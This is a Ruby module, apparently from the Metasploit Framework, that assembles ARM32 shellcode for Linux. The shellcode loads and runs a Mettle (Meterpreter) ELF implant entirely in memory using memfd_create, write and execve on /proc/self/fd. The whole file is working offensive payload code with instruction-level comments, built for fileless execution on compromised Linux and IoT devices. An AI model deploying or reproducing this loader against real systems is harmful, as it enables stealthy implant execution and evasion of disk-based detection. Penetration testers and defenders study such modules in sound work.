#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Martin Sutovsky <martin_sutovsky[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
# ARM32 conventions
#  Parameters: r0-r6
#  Syscall offset: r7
#  Return Address: lr/r14
#
module Msf::Payload::Linux::Armle::ElfLoader
  def in_memory_load(payload)
    # the exec syscall can be substituted with execveat syscall, which takes out the need for itoa, however, it proved to be not stable across various IoT-specific kernel versions
    in_memory_loader = [
      # memfd_create(null, MFD_CLOEXEC)
      0xe3a02000, # 0x1000:	mov	r2, #0	0xe3a02000
      0xe52d2004, # 0x1004:	str	r2, [sp, #-4]!	0xe52d2004
      0xe1a0000d, # 0x1008:	mov	r0, sp	0xe1a0000d
      0xe3a01001, # 0x100c:	mov	r1, #1	0xe3a01001
      0xe3a07083, # 0x1010:	mov	r7, #0x83	0xe3a07083
      0xe28770fe, # 0x1014:	add	r7, r7, #0xfe	0xe28770fe
      0xef000000, # 0x1018:	svc	#0	0xef000000
      # save fd to r3
      0xe1a03000, # 0x101c:	mov	r3, r0	0xe1a03000

      # use branch and branch with linking to get address of payload data
      0xea00001d, # 0x1020:	b	#0x109c	0xea00001d
      0xe1a0100e, # 0x1024:	mov	r1, lr	0xe1a0100e

      # write(fd,payload, payload_length)
      0xe5912000, # 0x1028:	ldr	r2, [r1]	0xe5912000
      0xe2811026, # 0x102c:	add	r1, r1, #0x26	0xe2811026
      0xe3a07004, # 0x1030:	mov	r7, #4	0xe3a07004
      0xef000000, # 0x1034:	svc	#0	0xef000000

      # use custom itoa to convert fd into string and append it to /proc/self/fd/
      0xe2411002, # 0x1038:	sub	r1, r1, #2	0xe2411002
      0xe1a0a001, # 0x103c:	mov	sl, r1	0xe1a0a001
      0xe3a0200a, # 0x1040:	mov	r2, #0xa	0xe3a0200a
      0xe734f213, # 0x1044:	udiv	r4, r3, r2	0xe734f213
      0xe0050294, # 0x1048:	mul	r5, r4, r2	0xe0050294
      0xe0435005, # 0x104c:	sub	r5, r3, r5	0xe0435005
      0xe1a03004, # 0x1050:	mov	r3, r4	0xe1a03004
      0xe2855030, # 0x1054:	add	r5, r5, #0x30	0xe2855030
      0xe5ca5000, # 0x1058:	strb	r5, [sl]	0xe5ca5000
      0xe24aa001, # 0x105c:	sub	sl, sl, #1	0xe24aa001
      0xe3540000, # 0x1060:	cmp	r4, #0	0xe3540000
      0x1afffff6, # 0x1064:	bne	#0x1044	0x1afffff6
      0xe3a0902f, # 0x1068:	mov	sb, #0x2f	0xe3a0902f
      0xe5dab000, # 0x106c:	ldrb	fp, [sl]	0xe5dab000
      0xe15b0009, # 0x1070:	cmp	fp, sb	0xe15b0009
      0x0a000002, # 0x1074:	beq	#0x1084	0x0a000002
      0xe5ca9000, # 0x1078:	strb	sb, [sl]	0xe5ca9000
      0xe24aa001, # 0x107c:	sub	sl, sl, #1	0xe24aa001
      0xeafffff9, # 0x1080:	b	#0x106c	0xeafffff9
      0xe24aa00d, # 0x1084:	sub	sl, sl, #0xd	0xe24aa00d
      # execve(/proc/self/fd/[fd],0,0)
      0xe1a0000a, # 0x1088:	mov	r0, sl	0xe1a0000a
      0xe3a01000, # 0x108c:	mov	r1, #0	0xe3a01000
      0xe3a02000, # 0x1090:	mov	r2, #0	0xe3a02000
      0xe3a0700b, # 0x1094:	mov	r7, #0xb	0xe3a0700b
      0xef000000, # 0x1098:	svc	#0	0xef000000
      0xebffffe0, # 0x109c:	bl	#0x1024	0xebffffe0

      payload.length,
      0x00000123 # .word
    ].pack('V*')
    fd_path = '/proc/self/fd/'.bytes.pack('C*') + "\x00" * 16
    in_memory_loader + fd_path
  end
end
